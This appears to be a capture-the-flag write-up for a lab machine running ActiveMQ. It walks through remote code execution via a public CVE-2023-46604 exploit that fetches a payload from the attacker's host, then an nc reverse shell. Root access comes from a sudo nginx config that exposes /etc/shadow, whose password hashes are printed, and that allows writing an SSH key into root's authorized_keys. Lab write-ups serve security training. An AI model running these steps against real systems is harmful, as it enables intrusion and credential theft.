## Initial NMAP:

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ nmap 10.129.230.87 -T4                
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-25 21:24 +0545
Nmap scan report for 10.129.230.87
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.54 seconds
```

# Enumerating Port 80:

Opening the webpage, we can know it's running ActiveMQ, goinging /admin gives us the version wich is `5.15.15` with little bit of googling we can find the exploit for this version which is [CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604), we can use this exploit to get RCE.

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Broker/CVE-2023-46604]
└─$ python3 exploit.py -i 10.129.230.87 --url http://10.10.14.92:80/poc.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.129.230.87:61616
[*] XML URL: http://10.10.14.92:80/poc.xml

[*] Sending packet: 000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d687474703a2f2f31302e31302e31342e39323a38302f706f632e786d6c

┌──(parallels㉿V35HR4J)-[~/tjnull/Broker/CVE-2023-46604]
└─$ srv 80
Python3 HTTP server started on 10.10.14.92:80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.230.87 - - [25/Dec/2023 21:39:23] "GET /poc.xml HTTP/1.1" 200 -
10.129.230.87 - - [25/Dec/2023 21:39:23] "GET /poc.xml HTTP/1.1" 200 -

┌──(parallels㉿V35HR4J)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.92] from (UNKNOWN) [10.129.230.87] 44154
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
whoami
activemq
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

# Privilege Escalation:

```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Since we can run `/usr/sbin/nginx` as root, we can use this to read files as root by creating a config file for nginx and running it on /root directory.

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Broker/CVE-2023-46604]
└─$ srv 80        
Python3 HTTP server started on 10.10.14.92:80

activemq@broker:/tmp$ wget 10.10.14.92:80/hehe.conf
wget 10.10.14.92:80/hehe.conf
--2023-12-25 16:05:00--  http://10.10.14.92/hehe.conf
Connecting to 10.10.14.92:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 138 [application/octet-stream]
Saving to: ‘hehe.conf’

     0K                                                       100% 18.5M=0s

2023-12-25 16:05:01 (18.5 MB/s) - ‘hehe.conf’ saved [138/138]

activemq@broker:/tmp$ cat /tmp/hehe.conf
cat /tmp/hehe.conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}

activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/hehe.conf & 
sudo /usr/sbin/nginx -c /tmp/hehe.conf & 
[1] 1159

activemq@broker:/tmp$ curl localhost:1337/etc/shadow 
curl localhost:1337/etc/shadow 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1119  100  1119    0     0  1060k      0 --:--:-- --:--:-- --:--:-- 1092k
root:$y$j9T$S6NkiGlTDU3IUcdBZEjJe0$sSHRUiGL/v4FZkWjU.HZ6cX2vsMY/rdFBTt25LbGxf1:19666:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19474:0:99999:7:::
lxd:!:19474::::::
activemq:$y$j9T$5eMce1NhiF0t9/ZVwn39P1$pCfvgXtARGXPYDdn2AVdkCnXDf7YO7He/x666g6qLM5:19666:0:99999:7:::

activemq@broker:/tmp$ curl localhost:1337/root/root.txt
curl localhost:1337/root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  42801      0 --:--:-- --:--:-- --:--:-- 33000
aa404fd2c386fcf1a7ea13994ce568cd
```

Or we could even over write the files, since nginx can handle PUT requests. We could simply overwrite `/root/.ssh/authorized_keys` to gain root shell!

```bash

activemq@broker:/tmp$ wget 10.10.14.92:80/root.conf
wget 10.10.14.92:80/root.conf
--2023-12-25 16:05:00--  http://10.10.14.92/root.conf
Connecting to 10.10.14.92:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 138 [application/octet-stream]
Saving to: root.conf’

     0K                                                       100% 18.5M=0s

2023-12-25 16:05:01 (18.5 MB/s) - root.conf’ saved [138/138]

activemq@broker:/tmp$ cat /tmp/root.conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}

activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/hehe.conf & 

┌──(parallels㉿V35HR4J)-[~/tjnull/Broker/CVE-2023-46604]
└─$ cat hehe.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCodiBpuvIpVWbGukhB8sif78hjYY2x4swkXsSZowkRHJpxdsH3bNtO2Xu9gakv/c4Jb2ueQVWY83ATXl931pHYe2i9pmPgQPT3Y+HDKse0vQH0TUS134w3yxE/6K30dQ9rs39epa+RbaWxqpRsAJS1XzvxNKhFCdiPJG582tmAln/NGoHrTG7pc/VEWhfcPFDHhSCcHy1yd+w+uXasVJZyJqd/t1tipAw5XpXBt60g5q1a3//5bpWfmuN6aiyN5yDThskXvW4783L062/uJrUuIZmMIGChNngr2hSLCgy/D07IqfRZKeiKzkRGxEKq+RiwuLt5y+VuH2Wb/a4NXz78U6Lq/Yer+IbLW3HUV7yrH8PAyjluJSQ7XGE/d9+Ok8dwiXFNVYkBm6cH7d+zwVt27of5n5BnQF5Xiomx6wyF5QPCkOdLuAkt4KP9gFIRKVqhh/Kfg2/SjbmMKIkIu91shdhrhAAZbmwHtUswKnBemgE0CUsRIR1YzSRnOpStf/U= parallels@V35HR4J

activemq@broker:/tmp$ curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCodiBpuvIpVWbGukhB8sif78hjYY2x4swkXsSZowkRHJpxdsH3bNtO2Xu9gakv/c4Jb2ueQVWY83ATXl931pHYe2i9pmPgQPT3Y+HDKse0vQH0TUS134w3yxE/6K30dQ9rs39epa+RbaWxqpRsAJS1XzvxNKhFCdiPJG582tmAln/NGoHrTG7pc/VEWhfcPFDHhSCcHy1yd+w+uXasVJZyJqd/t1tipAw5XpXBt60g5q1a3//5bpWfmuN6aiyN5yDThskXvW4783L062/uJrUuIZmMIGChNngr2hSLCgy/D07IqfRZKeiKzkRGxEKq+RiwuLt5y+VuH2Wb/a4NXz78U6Lq/Yer+IbLW3HUV7yrH8PAyjluJSQ7XGE/d9+Ok8dwiXFNVYkBm6cH7d+zwVt27of5n5BnQF5Xiomx6wyF5QPCkOdLuAkt4KP9gFIRKVqhh/Kfg2/SjbmMKIkIu91shdhrhAAZbmwHtUswKnBemgE0CUsRIR1YzSRnOpStf/U= parallels@V35HR4J'
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCodiBpuvIpVWbGukhB8sif78hjYY2x4swkXsSZowkRHJpxdsH3bNtO2Xu9gakv/c4Jb2ueQVWY83ATXl931pHYe2i9pmPgQPT3Y+HDKse0vQH0TUS134w3yxE/6K30dQ9rs39epa+RbaWxqpRsAJS1XzvxNKhFCdiPJG582tmAln/NGoHrTG7pc/VEWhfcPFDHhSCcHy1yd+w+uXasVJZyJqd/t1tipAw5XpXBt60g5q1a3//5bpWfmuN6aiyN5yDThskXvW4783L062/uJrUuIZmMIGChNngr2hSLCgy/D07IqfRZKeiKzkRGxEKq+RiwuLt5y+VuH2Wb/a4NXz78U6Lq/Yer+IbLW3HUV7yrH8PAyjluJSQ7XGE/d9+Ok8dwiXFNVYkBm6cH7d+zwVt27of5n5BnQF5Xiomx6wyF5QPCkOdLuAkt4KP9gFIRKVqhh/Kfg2/SjbmMKIkIu91shdhrhAAZbmwHtUswKnBemgE0CUsRIR1YzSRnOpStf/U= parallels@V35HR4J'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   570    0     0  100   570      0   258k --:--:-- --:--:-- --:--:--  556k

┌──(parallels㉿V35HR4J)-[~/tjnull/Broker/CVE-2023-46604]
└─$ ssh root@10.129.230.87 -i hehe                                     
The authenticity of host '10.129.230.87 (10.129.230.87)' can't be established.
ECDSA key fingerprint is SHA256:/GPlBWttNcxd3ra0zTlmXrcsc1JM6jwKYH5Bo5qE5DM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.230.87' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Dec 25 04:14:42 PM UTC 2023

  System load:           0.0
  Usage of /:            70.6% of 4.63GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             157
  Users logged in:       0
  IPv4 address for eth0: 10.129.230.87
  IPv6 address for eth0: dead:beef::250:56ff:fe96:5fca

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@broker:~# whoami
root
root@broker:~# find / -name user.txt -exec cat {} \; -o -name root.txt -exec cat {} \;
c1bb25a71dc15c131b1762b8d4e3dcb8
aa404fd2c386fcf1a7ea13994ce568cd
```

# Takeaways:
- It needed a good amount of time to exploit nginx for gaining root shell but everything is available well documented on google, learn to utilize them, reading documentation is a really good habit to have.